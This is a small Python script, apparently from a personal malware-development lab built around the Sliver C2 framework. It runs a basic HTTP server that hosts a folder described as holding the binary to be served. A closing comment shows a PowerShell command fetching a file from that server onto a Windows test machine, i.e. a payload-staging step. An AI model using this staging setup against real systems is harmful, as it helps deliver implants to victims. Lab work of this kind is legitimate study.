# server.py
import http.server
import socketserver

PORT = 8000
#DIRECTORY = "/home/llorens/projects/mal-dev-lab/c2-sliver/mocks/"  # Carpeta con el binario que quieres servir
DIRECTORY = "/home/llorens/projects/sliver"  # Carpeta con el binario que quieres servir

class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=DIRECTORY, **kwargs)

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"Servidor escuchando en el puerto {PORT}")
    httpd.serve_forever()


# PS C:\Users\test> IWR http://172.16.41.1:8000/cdn.py -O "C:\Users\test\Documents\cdn.py"
